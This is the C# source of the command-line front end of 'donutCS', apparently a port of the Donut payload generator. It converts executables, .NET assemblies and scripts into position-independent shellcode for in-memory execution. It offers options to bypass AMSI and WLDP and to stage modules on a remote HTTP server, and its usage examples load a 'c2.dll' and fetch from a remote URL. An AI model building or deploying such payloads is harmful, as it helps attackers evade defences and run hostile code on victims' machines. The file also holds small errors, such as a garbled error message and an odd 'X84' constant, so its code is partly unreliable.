using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;

using CommandLine;
using donutCS.Structs;

namespace donutCS
{
    class Donut
    {
        static unsafe void Main(string[] args)
        {
            D.Print("Starting Donut");
            var options = new Options();
            string outfile = "";

            // Set Default
            var config = new DSConfig
            {
                arch = Constants.DONUT_ARCH_X84,
                bypass = Constants.DONUT_BYPASS_CONTINUE,
                inst_type = Constants.DONUT_INSTANCE_PIC,
                mod_len = 0,
                inst_len = 0,
                pic = IntPtr.Zero,
                pic_len = 0,
                cls = new char[Constants.DONUT_MAX_NAME],
                domain = new char[Constants.DONUT_MAX_NAME],
                method = new char[Constants.DONUT_MAX_NAME],
                modname = new char[Constants.DONUT_MAX_NAME],
                file = new char[Constants.DONUT_MAX_NAME],
                runtime = new char[Constants.DONUT_MAX_NAME],
                url = new char[Constants.DONUT_MAX_NAME],
                param = new char[(Constants.DONUT_MAX_PARAM + 1) * Constants.DONUT_MAX_NAME]
            };

            D.Print("Parsing Arguements:");
            // Parse args and assign to struct
            Parser.Default.ParseArguments<Options>(args).WithParsed<Options>(opts =>
            {
                if (opts.InputFile.Equals(null) == false){ opts.GetUsage(); }

                try { if (opts.InputFile.Equals(null) == false)
                    { Array.Copy(opts.InputFile.ToCharArray(),0,config.file,0, opts.InputFile.ToCharArray().Length);
                    D.Print($"\tFile:\t {opts.InputFile}"); }} catch { };

                try { if (opts.Payload.Equals(null) == false)
                    { outfile = opts.Payload;
                    D.Print($"\tOutfile: {opts.Payload}"); }} catch { };

                try { if (opts.Arch.Equals(null) == false)
                    { config.arch = opts.Arch;
                    D.Print($"\tArch:\t {config.arch}"); };} catch { };

                try { if (opts.Level.Equals(null) == false)
                    { config.bypass = opts.Level;
                    D.Print($"\tBypass:\t {config.bypass}"); };} catch { };

                try { if (opts.NamespaceClass.Equals(null) == false)
                    { Array.Copy(opts.NamespaceClass.ToCharArray(),0,config.cls,0,opts.NamespaceClass.ToCharArray().Length);
                    D.Print($"\tClass:\t {opts.NamespaceClass}"); };} catch { };

                try { if (opts.Method.Equals(null) == false)
                    { Array.Copy(opts.Method.ToCharArray(),0,config.method,0,opts.Method.ToCharArray().Length);
                    D.Print($"\tMethod:\t {opts.Method}"); };} catch { };

                try { if (opts.Args.Equals(null) == false)
                    { Array.Copy(opts.Args.ToCharArray(),0,config.param,0,opts.Args.ToCharArray().Length);
                    D.Print($"\tArgs:\t {opts.Args}"); };} catch { };

                try { if (opts.Version.Equals(null) == false)
                    { Array.Copy(opts.Version.ToCharArray(),0,config.runtime,0,opts.Version.ToCharArray().Length);
                    D.Print($"\tVersion:\t {opts.Version}"); };} catch { };

                try { if (opts.URL.Equals(null) == false)
                    { Array.Copy(opts.URL.ToCharArray(),0,config.url,0,opts.URL.ToCharArray().Length);
                    config.inst_type = Constants.DONUT_INSTANCE_URL;
                    D.Print($"\tURL:\t {opts.URL}"); };} catch { };
            });

            // Start Generation with Config
            int ret = Generator.Donut_Create(ref config);
            D.Print($"Donut_Create() finished with: {GetError(ret)}");
            if (ret != Constants.DONUT_ERROR_SUCCESS)
            {
                Environment.Exit(0);
            }

            // Raw bytes to file
            try
            {
                FileStream file = new FileStream(outfile, FileMode.Create, FileAccess.Write);
                UnmanagedMemoryStream filestream = new UnmanagedMemoryStream((byte*)config.pic, Convert.ToInt32(config.pic_cnt));
                filestream.CopyTo(file);
                filestream.Close();
                file.Close();
                D.Print($"Wrote raw payload to {outfile}");

                File.WriteAllText($@"{outfile}.b64", Convert.ToBase64String(File.ReadAllBytes(outfile)));
                D.Print($"Wrote Base64'd payload to {outfile}.b64");
            }
            catch
            {
                D.Print("Failed to write payload to file");
            }
            // Free PIC shellcode
            Marshal.FreeHGlobal(config.pic);
        }

        // Correlate error value to string
        public static string GetError(int ret)
        {
            string returnval = "";
            switch (ret)
            {
                case Constants.DONUT_ERROR_SUCCESS:
                    returnval = "[*] Success";
                    break;
                case Constants.DONUT_ERROR_FILE_NOT_FOUND:
                    returnval = "[-] File not found";
                    break;
                case Constants.DONUT_ERROR_FILE_EMPTY:
                    returnval = "[-] File is empty";
                    break;
                case Constants.DONUT_ERROR_FILE_ACCESS:
                    returnval = "[-] Cannot open file";
                    break;
                case Constants.DONUT_ERROR_FILE_INVALID:
                    returnval = "[-] File is invalid";
                    break;
                case Constants.DONUT_ERROR_NET_PARAMS:
                    returnval = "[-] File is a .NET DLL. Donut requires a class and method";
                    break;
                case Constants.DONUT_ERROR_NO_MEMORY:
                    returnval = "[-] No memory available";
                    break;
                case Constants.DONUT_ERROR_INVALID_ARCH:
                    returnval = "[-] Invalid architecture specified";
                    break;
                case Constants.DONUT_ERROR_INVALID_URL:
                    returnval = "[-] Invalid URL";
                    break;
                case Constants.DONUT_ERROR_URL_LENGTH:
                    returnval = "[-] Invalid URL length";
                    break;
                case Constants.DONUT_ERROR_INVALID_PARAMETER:
                    returnval = "[-] Invalid parameter";
                    break;
                case Constants.DONUT_ERROR_RANDOM:
                    returnval = "[-] Error generating random values";
                    break;
                case Constants.DONUT_ERROR_DLL_FUNCTION:
                    returnval = "[-] Unable to locate DLL function provided. Names are case Constants.sensitive";
                    break;
                case Constants.DONUT_ERROR_ARCH_MISMATCH:
                    returnval = "[-] Target architecture cannot support selected DLL/EXE file";
                    break;
                case Constants.DONUT_ERROR_DLL_PARAM:
                    returnval = "[-] You've supplied parameters for an unmanaged DLL. Donut also requires a DLL function";
                    break;
                case Constants.DONUT_ERROR_BYPASS_INVALID:
                    returnval = "[-] Invalid bypass option specified";
                    break;
                case Constants.DONUT_ERROR_NORELOC:
                    returnval = "[-] This file has no relocation information required for in-memory execution.";
                    break;
            }
            return returnval;
        }
    }

    class Options
    {
        [Option('f', "InputFile", Required = true, HelpText = ".NET assembly, EXE, DLL, VBS, JS or XSL file to execute in-memory.")]
        public string InputFile { get; set; }

        [Option('u', "URL", HelpText = "HTTP server that will host the donut module.")]
        public string URL { get; set; }

        [Option('a', "Arch", HelpText = "Target architecture : 1=x86, 2=amd64, 3=amd64+x86.", Default = 3)]
        public int Arch { get; set; }

        [Option('b', "Level", HelpText = "Bypass AMSI/WLDP : 1=skip, 2=abort on fail, 3=continue on fail.", Default = 3)]
        public int Level { get; set; }

        [Option('o', "Payload", HelpText = "Output file.", Default = @"payload.bin")]
        public string Payload { get; set; }

        [Option('c', "NamespaceClass", HelpText = "Optional class name.  (required for .NET DLL)")]
        public string NamespaceClass { get; set; }

        [Option('m', "Method", HelpText = "Optional method or API name for DLL. (required for .NET DLL)")]
        public string Method { get; set; }

        [Option('p', "Args", HelpText = "Optional parameters or command line, separated by comma or semi-colon.")]
        public string Args { get; set; }

        [Option('r', "Version", HelpText = "CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.")]
        public string Version { get; set; }

        [Option('d', "Name", HelpText = "AppDomain name to create for .NET. Randomly generated by default.")]
        public string Name { get; set; }

        public string GetUsage()
        {
            var usage = new StringBuilder();
            usage.Append("[!] Usage: donut [options] -f <EXE/DLL/VBS/JS/XSL>\n");
            usage.Append("[!] Examples:\n");
            usage.Append("    donut -f c2.dll\n");
            usage.Append("    donut -a1 -cTestClass -mRunProcess -pnotepad.exe -floader.dll\n");
            usage.Append("    donut -f loader.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe -u http://remote_server.com/modules/\n");
            return usage.ToString();
        }
    }
}
